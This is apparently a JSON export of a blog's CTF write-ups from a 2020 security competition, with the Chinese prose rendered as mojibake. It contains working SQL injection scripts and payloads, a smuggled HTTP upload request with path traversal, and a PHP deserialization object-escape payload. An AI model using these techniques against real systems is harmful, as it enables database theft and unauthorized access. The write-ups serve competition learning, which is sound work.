&#123; var action &#x3D; req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;); var html &#x3D; pug.renderFile(file); res.send(html);&#125;); ä¸Šä¼ a.pugåˆ°/templateä¸‹å³å¯ pugè¯­æ³•ï¼š https://segmentfault.com/a/1190000006198621 12345doctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt ä¿®æ”¹æºç æŠŠipé™åˆ¶å»æ‰æŠ“åŒ… 123456789101112131415161718POST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827-- ç»“åˆCRLF 123456789101112131415161718192021222324252627payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827--GET &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39; æœ€åè®¿é—® è¿™é‡Œå‘åŒ…æ ¼å¼è¿˜æ˜¯æŒºç»†çš„ï¼Œå¯ä»¥é€šè¿‡wiresharkåˆ†ææ’æŸ¥ï¼Œæ¯”å¦‚ä¸€å¼€å§‹æˆ‘å‡ºç°è¿‡ä¸‹é¢çš„è§£æé”™è¯¯ ezExpressæ˜æ˜¾çš„JavaScriptåŸå‹é“¾æ±¡æŸ“ ç•™ä¸‹äº†ä¸å­¦æ— æœ¯çš„çœ¼æ³ª.jpg =================åˆ†å‰²çº¿ JavaScriptåŸå‹é“¾æ±¡æŸ“ï¼š https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ easy_thinkingåº”è¯¥æ˜¯tpæ¡†æ¶ï¼Œæç¤ºVulnerability Searchï¼Œå¯èƒ½æ˜¯æœç´¢åŠŸèƒ½æœ‰é—®é¢˜ äº§ç”ŸæŠ¥é”™ tp6.0ï¼Œåº”è¯¥ä¼šç»™æºç ï¼Œæ‰«äº†ä¸‹ï¼Œå‘ç°www.zip https://paper.seebug.org/1114/ çŒœæµ‹æ˜¯æœç´¢è®°å½•æ˜¯dataï¼Œsessionidæ˜¯æ–‡ä»¶åï¼Œæƒ³æœ¬åœ°æµ‹è¯•ä¸‹ï¼Œå‘ç°è¿è¡ŒæŠ¥é”™ [Sun Feb 23 06:18:54 2020] PHP Warning: require(/root/Desktop/web/public/vendor/autoload.php): failed to open stream: No such file or directory in /root/Desktop/web/public/index.php on line 6 å¯¹ç…§tp6æ–‡ä»¶ï¼Œå…ˆå°†index.phpç§»åˆ°publicä¸­ï¼Œå†ä¿®æ”¹ require __DIR__ . &#39;/../vendor/autoload.php&#39;; åˆæŠ¥é”™ æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨:public/static/tamplate/index\\index.html ä½†æ˜¯æ˜æ˜è·¯å¾„æ²¡é”™ï¼ŒæŸ¥çœ‹é…ç½® config/view.phpä¿®æ”¹view_dir_nameä¸ºpublic ä¿®æ”¹app/home/config/view.phpä¸ºstatic/tamplate/ æ€»ç®—èƒ½ç”¨äº†ã€‚ã€‚ åœ¨ç™»å½•çš„æ—¶å€™è®¾ç½®sessionçš„æ—¶å€™ä¿®æ”¹sessionidï¼Œåœ¨æŸ¥è¯¢çš„æ—¶å€™ç”¨è¿™ä¸ªsessionidå³å¯æ·»åŠ ä»»æ„å†…å®¹ ä½†æ˜¯è¿™æ ·è®¿é—®ä¸åˆ°ï¼Œéœ€è¦å†™å…¥app/home/controller/a.phpä¸‹ï¼Œ æ„é€ ../../../../app/home/controller/a.php é•¿åº¦37 ä¹Ÿæ²¡æœ‰æ–‡ä»¶åŒ…å«çš„åœ°æ–¹ã€‚ã€‚é‚ä½œç½¢ æ­£è§£å°±æ˜¯é¢˜ç›®ç¯å¢ƒç›´æ¥è®¿é—®å°±è¡Œã€‚ã€‚ å› ä¸ºæˆ‘æœ¬åœ°ä¿®æ”¹äº†ä¸€äº›é…ç½®å¯¼è‡´æ— æ³•è®¿é—®ã€‚ã€‚ä½†æ˜¯ä¸æ”¹è°ƒè¯•ä¸äº†ã€‚ã€‚ æœ€åè¿˜éœ€è¦bypassdisable_funcï¼Œéœ€è¦æ‰§è¡Œ/readflag è¿™ä¸ªåšè¿‡å‡ æ¬¡ï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼ŒåŒ…æ‹¬mail()ç­‰ https://github.com/mm0r1/exploits","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2","date":"2020-02-22T14:56:52.000Z","updated":"2020-02-27T10:48:03.663Z","comments":true,"path":"2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-2/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• easysqli_copy blacklist Ezsqli æ”¾ä¸Šæˆ‘xxxxx easysqli_copyçœ‹åˆ°PDO+set names gbk å°±æƒ³åˆ°å®½å­—èŠ‚æ³¨å…¥ï¼Œä¹‹å‰çœ‹è¿‡çš„æ–‡ç«  ä»å®½å­—èŠ‚æ³¨å…¥è®¤è¯†PDOçš„åŸç†å’Œæ­£ç¡®ä½¿ç”¨ï¼šhttps://www.freebuf.com/articles/web/216336.html ç®€å•æµ‹è¯•äº†ä¸‹ï¼Œå‘ç°å¯ä»¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†selectï¼Œæˆ‘ç®€å•æµ‹è¯•äº†ä¸‹å‘ç°å­˜åœ¨å †å æ³¨å…¥ï¼Œæ²¡æœ‰è¿‡æ»¤=ï¼Œä¸‡äº‹å¤§å‰ 1234select hex(&#39;select sleep(5)&#39;);set @a&#x3D;0x73656C65637420736C656570283529;prepare smtm_test from @a;execute smtm_test; 1?id&#x3D;1%df&#39;;set%20@a&#x3D;0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test; è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import urllibimport requestsurl = \"http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" # payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name='table1')\" payload = \"select(group_concat(fllllll4g))from(table1)\" payload = \"select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)\".format(payload, i, j) # print payload payload = payload.encode('hex') param = \"1\"+urllib.unquote(\"%df\")+\"';set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;\".format(payload) param = urllib.quote(param) # print(param) try: url1 = url + param r = requests.get(url=url1, timeout=3) if r.status_code != 200: j -= 1 continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) blacklist1return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\\.&#x2F;i&quot;,$inject); emmï¼Œè¿™ä¸ªé»‘åå•ä¼¼ä¹å¯ä»¥ç”¨æ˜¨å¤©çš„expæ‰“ã€‚ã€‚ã€‚ 1inject&#x3D;1&#39;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23 éœ€è¦å…ˆåˆ©ç”¨å †å æ³¨å…¥æŸ¥è¯¢è¡¨å’Œå­—æ®µ 11&#39;;show tables;# å¾—åˆ°FlagHere 11&#39;; show columns from &#96;FlagHere&#96;; # å¾—åˆ°flag 1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23 è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ©ç”¨æ˜¨å¤©çš„æ–¹æ³•åªèƒ½æŸ¥å½“å‰è¡¨ï¼Œè€Œflagåœ¨å¦ä¸€å¼ è¡¨ä¸­ã€‚ é‚ä½œç½¢ https://www.4hou.com/posts/mM60 éªšæ“ä½œï¼šhandler 12345678910HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 11&#39;;handler FlagHere open as a;handler a READ first;# å¾—åˆ°flag Ezsqlibpè·‘ä¸€ä¸‹sqlå­—å…¸ ä¸æ˜¯200å°±æ˜¯500,500çš„æ˜¯è¯­æ³•é”™è¯¯ï¼Œå…¶å®è¿‡æ»¤å­—ç¬¦çš„å¹¶ä¸å¤š æ•°å­—å‹ï¼Œæœ‰å›æ˜¾è€ƒè™‘ç›²æ³¨ï¼Œç®€å•æ„é€ äº†ä¸‹æˆäº† bpè·‘ä¸€ä¸‹å‘ç°cçš„æ—¶å€™Hello Nu1L æ•°æ®åº“ä¸ºctf,mysqlç‰ˆæœ¬ä¸º5.7.1 å‘ç°innodbä¹Ÿè¢«è¿‡æ»¤ã€‚ã€‚ èŠä¸€èŠbypass information_schemaï¼šhttps://www.anquanke.com/post/id/193512 å‰æè¦æ˜¯mysql â‰¥ 5.7ç‰ˆæœ¬ æ–°ç‰¹æ€§sys.schema_auto_increment_columnsä¹Ÿè¢«è¿‡æ»¤ã€‚ã€‚ 1select table_name from sys.schema_auto_increment_columns where table_schema&#x3D;&#39;ctf&#39; è¿˜æœ‰å¦ä¸€ç§ 1sys.schema_table_statistics_with_buffer 1select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer æˆåŠŸå¾—åˆ°äº†è¡¨åusers233333333333333,f1ag_1s_h3r3_hhhhh, 1select * from f1ag_1s_h3r3_hhhhh æŠ¥500é”™è¯¯ï¼Œè¯´æ˜ä¸æ­¢1åˆ—ã€‚ã€‚ã€‚çŒœäº†å‡ ä¸ªå­—æ®µä¹Ÿä¸è¡Œ==ï¼æ— åˆ—åæ³¨å…¥å®åœ¨æä¸å‡ºæ¥ã€‚ã€‚ æ­£è§£ 1(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1) è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python2# coding=utf-8import requestss = requests.session()url = \"http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;cookies = &#123;&#125;data = &#123;&#125;flag = \"\"tmp = 0# for i in range(1, 100):# if tmp == 1:# break# tmp = 1# for j in range(32, 127):# # payload = \"select version()\"# payload = \"select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer\"# param = \"0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#\".format(payload, str(i), str(j))# print(param)# data = &#123;# 'id': param# &#125;# r = requests.post(url=url, headers=headers, data=data)# # print(r.content.decode('utf-8'))# if \"Nu1L\" in r.content.decode(\"utf-8\"):# tmp = 0# flag = flag + chr(j)# print(flag)# break# print(flag)flag = ''for i in range(1,100): for j in range(32,127): # param = \"0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format((flag + chr(j)).encode('hex')) param = \"0^((select 1,concat('&#123;&#125;', CAST('0' as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format(flag + chr(j)) # print param data = &#123; 'id': param &#125; r = requests.post(url=url, headers=headers, data=data) if \"Nu1L\" in r.content.decode(\"utf-8\"): tmp = 0 flag = flag + chr(j-1) print(flag) break print(flag) æœ‰ä¸ªç¼ºé™·ï¼Œå°±æ˜¯ä¸åŒºåˆ†å¤§å°å†™ã€‚ã€‚ https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg é¢„æœŸè§£æ˜¯æ–‡ç« ä¸­æåˆ°çš„ä½¿ç”¨ SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) æ¥å¦å…¶è¿”å›äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä»è€ŒåŒºåˆ†å¤§å°å†™ã€‚ æµ‹è¯•äº†ä¸€ä¸‹ SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) éœ€è¦mysql&gt;=5.7 å¯¹äºsys.x$schema_table_statistics_with_bufferæ˜¯è§†å›¾ï¼Œæ‰€ä»¥ä¸€å¼€å§‹æœ¬åœ°æ²¡æ‰¾åˆ°==ï¼ è§†å›¾æ˜¯åœ¨åŸºæœ¬è¡¨ä¹‹ä¸Šå»ºç«‹çš„è¡¨ï¼Œå®ƒçš„ç»“æ„ï¼ˆå³æ‰€å®šä¹‰çš„åˆ—ï¼‰å’Œå†…å®¹ï¼ˆå³æ‰€æœ‰è®°å½•ï¼‰éƒ½æ¥è‡ªåŸºæœ¬è¡¨ï¼Œå®ƒä¾æ®åŸºæœ¬è¡¨å­˜åœ¨è€Œå­˜åœ¨ã€‚ä¸€ä¸ªè§†å›¾å¯ä»¥å¯¹åº”ä¸€ä¸ªåŸºæœ¬è¡¨ï¼Œä¹Ÿå¯ä»¥å¯¹åº”å¤šä¸ªåŸºæœ¬è¡¨ã€‚è§†å›¾æ˜¯åŸºæœ¬è¡¨çš„æŠ½è±¡å’Œåœ¨é€»è¾‘æ„ä¹‰ä¸Šå»ºç«‹çš„æ–°å…³ç³»ã€‚","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1","date":"2020-02-22T07:05:27.000Z","updated":"2020-02-27T10:46:57.992Z","comments":true,"path":"2020/02/22/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-1/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-1/","excerpt":"æœ€è¿‘åšå•¥éƒ½æ²¡è€å¿ƒ==ï¼","text":"æœ€è¿‘åšå•¥éƒ½æ²¡è€å¿ƒ==ï¼ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç›²æ³¨ ç¬¬ä¸€ç§ï¼Œä¸ç”¨selectï¼ˆåªèƒ½æŸ¥å½“å‰è¡¨ï¼‰ ç¬¬äºŒç§ï¼Œåˆ©ç”¨å †å æ³¨å…¥ï¼Œ16è¿›åˆ¶+mysqlé¢„å¤„ç† babyphp å‚è€ƒé“¾æ¥: ç›²æ³¨ç»™äº†æºç ï¼Œç®€å•æµ‹ä¸€ä¸‹è¿‡æ»¤å†…å®¹ selectè¢«è¿‡æ»¤ï¼ï¼ä»¥åŠ= likeç­‰ï¼Œå¯ç”¨regexp æ²¡æœ‰å›æ˜¾è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚selectè¢«è¿‡æ»¤ï¼Œæˆ‘é€šå¸¸ä¸¤ç§åŠæ³•ï¼Œ ç¬¬ä¸€ç§ï¼Œä¸ç”¨selectï¼ˆåªèƒ½æŸ¥å½“å‰è¡¨ï¼‰11 and if(1,sleep(5),1) æˆåŠŸå»¶æ—¶ 121 and if(database() regexp(&#39;^&#39;))1 and if((flllllllag.fl4g regexp&quot;^f&quot;),sleep(5),1) ä¸€å¼€å§‹ä¸çŸ¥é“ä¸ºå•¥è·‘åˆ°flag{å°±æ–­äº†ï¼Œç´¢æ€§åŠ ä¸ªhex()ï¼Œå°±å¥½äº† 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python2# coding=utf-8import stringimport requestsurl = \"http://de1da794b0d046e6abd2bf3f1a1c8f8d25930eca82df4eb4.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;easy_string = string.digits + string.ascii_letters# print easy_stringflag = \"\"tmp = 0flag = ''for i in range(1, 100): if tmp == 1: break tmp = 1 for j in easy_string: param = '2 or if((hex(flllllllag.fl4g) regexp\"^&#123;&#125;\"),sleep(5),1)'.format(flag+j) # print param try: url1 = url + param r = requests.get(url=url1, headers=headers, timeout=3) # if r.status_code != 200: # j -= 1 # continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + j print(flag) breakprint(flag) ç¬¬äºŒç§ï¼Œåˆ©ç”¨å †å æ³¨å…¥ï¼Œ16è¿›åˆ¶+mysqlé¢„å¤„ç† å †å æ³¨å…¥ï¼š https://www.jianshu.com/p/36f0772f5ce8 å…ˆåˆ¤æ–­èƒ½å¦å †å æ³¨å…¥ï¼Œæ—¢ç„¶ä¸èƒ½ç”¨selectï¼Œç”¨showä»£æ›¿ 11;show tables;# å‘ç°æ²¡æœ‰æŠ¥500ï¼Œåº”è¯¥å¯ä»¥å †å æ³¨å…¥ 3ç§payload 1PREPARE jwt from concat(char(115,101,108,101,99,116), &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 1SET @sql&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE jwt from @sql;EXECUTE jwt;# 1PREPARE jwt from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# ä½†æ˜¯æˆ‘æœ¬åœ°æµ‹è¯•æ—¶åªæœ‰ç¬¬äºŒä¸ªèƒ½æ‰§è¡Œï¼Œè€Œç¬¬äºŒä¸ªæ°æ°ä½¿ç”¨äº†= çŒœæµ‹æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œå…ˆå»çœ‹äº†åŸé¢˜ ç®€å•æ¥è¯´ï¼ŒMariaDBæ˜¯MySQLæºä»£ç çš„ä¸€ä¸ªåˆ†æ”¯ , MariaDBåŒ…æ‹¬çš„ä¸€äº›æ–°ç‰¹æ€§ä½¿å®ƒä¼˜äºMySQLã€‚ MariaDBè·ŸMySQLåœ¨ç»å¤§å¤šæ•°æ–¹é¢æ˜¯å…¼å®¹çš„ï¼Œå¯¹äºå¼€å‘è€…æ¥è¯´ï¼Œå‡ ä¹æ„Ÿè§‰ä¸åˆ°ä»»ä½•ä¸åŒã€‚ ç„¶åæˆ‘æŠŠæœ¬åœ°mysqlç‰ˆæœ¬åˆ‡åˆ°mysql8.0.12ï¼Œå·²é€‰æ‹©æ‰§è¡Œæ˜¯æ­£å¸¸çš„ï¼Œæ•´ä¸ªæ‰§è¡Œè¿˜æ˜¯ä¸€æ ·ä¸è¡Œ æƒ³ç›´æ¥åœ¨é¢˜ç›®ä¸Šæ‰“ä¸€æ‰“è¯•è¯•ï¼Œå‘ç°ç¯å¢ƒå·²ç»å…³äº†ï¼Œé‚ä½œç½¢ babyphpwww.zipæºç æ³„éœ²ï¼Œä»£ç å®¡è®¡ï¼Œæ€è·¯å¾ˆæ˜ç¡®ï¼Œ 1234if($_SESSION[&#39;login&#39;]&#x3D;&#x3D;&#x3D;1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; éœ€è¦æˆåŠŸç™»å½•adminï¼Œ å¯»æ‰¾ååºåˆ—åŒ–å…¥å£ï¼Œ 123456789101112public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘&#125;public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname)));&#125; æ­£å¸¸æƒ…å†µä¸‹è¿™é‡Œçš„ååºåˆ—åŒ–æˆ‘ä»¬åªèƒ½æ§åˆ¶Infoç±»çš„ä¸¤ä¸ªå±æ€§ï¼Œä½†æ˜¯è¿™é‡Œé€šè¿‡safe()æ–¹æ³•å¯ä»¥é€ƒé€¸å­—ç¬¦ï¼Œç”šè‡³è¿˜å¯ä»¥é€ƒé€¸å¯¹è±¡ æ€è·¯ä¸€ã€ User-&gt;__destruct()è¯»å–flag.php ä½†æ˜¯å¾ˆå¿«å°±å‘ç°è¡Œä¸é€šã€‚é¦–å…ˆæ˜¯returnï¼Œä¸ä¼šæ‰“å°å‡ºæ¥ï¼Œå…¶æ¬¡flagè¢«è¿‡æ»¤æ›¿æ¢æˆhacker æ€è·¯äºŒã€ æ³¨å‡ºadminå¯†ç ç™»é™†åæŸ¥çœ‹ UpdateHelperç±»-&gt;__destruct() Userç±»-&gt;toString() Infoç±»-&gt;__call() dbCtrlç±»-&gt;login() æ„é€ ä¸€ä¸ªæ­£å¸¸çš„payloadï¼Œæ¯”å¦‚POST:age=&amp;nickname= 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; æµ‹è¯•é€ƒé€¸ï¼Œæ¯”å¦‚é€ƒé€¸å‡º$CtrlCaseçš„å€¼ä¸ºhahaï¼Œ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; paylaod 1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; éœ€è¦é€ƒé€¸29ä¸ªå­—ç¬¦ï¼Œ&#39;-&gt;hackeré€ƒé€¸5ä¸ªå­—ç¬¦,æ„é€ 5ä¸ªå•å¼•å·å’Œ4ä¸ªunion POST:age=&amp;nickname=&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;} ä¸‹é¢æ˜¯åºåˆ—åŒ–å†…å®¹ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:55:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; å†ä¸¾ä¸ªé€ƒé€¸å¯¹è±¡çš„ä¾‹å­ 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 1&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 63ä¸ªé€ƒé€¸å­—ç¬¦-12ä¸ªå•å¼•å·å’Œ3ä¸ªunionï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯é¢˜ç›®ä¸­flagä¹Ÿè¢«æ›¿æ¢æˆhacker åœ¨æ„é€ å‰åˆ†æä¸‹sql 123456789$result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);$result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);$result-&gt;execute();$result-&gt;bind_result($idResult, $passwordResult);$result-&gt;fetch();$result-&gt;close();if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult;&#125; è¿”å›ç»“æœé›†ä¸­çš„$idResultï¼ŒæŸ¥è¯¢çš„æ—¶å€™æŠŠç¬¬ä¸€ä¸ªå‚æ•°æ”¹ä¸ºpasswordå³å¯ 1select password,id from user where username&#x3D;? payload 12345678910111213141516171819202122232425262728293031323334&lt;?phpClass UpdateHelper&#123; public $sql;&#125;Class User&#123; public $nickname; public $age;&#125;Class Info&#123; public $age; public $CtrlCase;&#125;Class dbCtrl&#123; public $name; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $token;&#125;$d = new dbCtrl;$d-&gt;name = 'admin';$d-&gt;token = 'admin';$c = new Info;$c-&gt;CtrlCase = $d;$b = new User;$b-&gt;age = 'select password,id from user where username=?';$b-&gt;nickname = $c;$a = new UpdateHelper;$a-&gt;sql = $b;echo serialize($a);?&gt; å¾—åˆ° 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125; æ»¡è¶³æ ¼å¼ 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; 365ä½ï¼Œ73ä¸ªå•å¼•å· 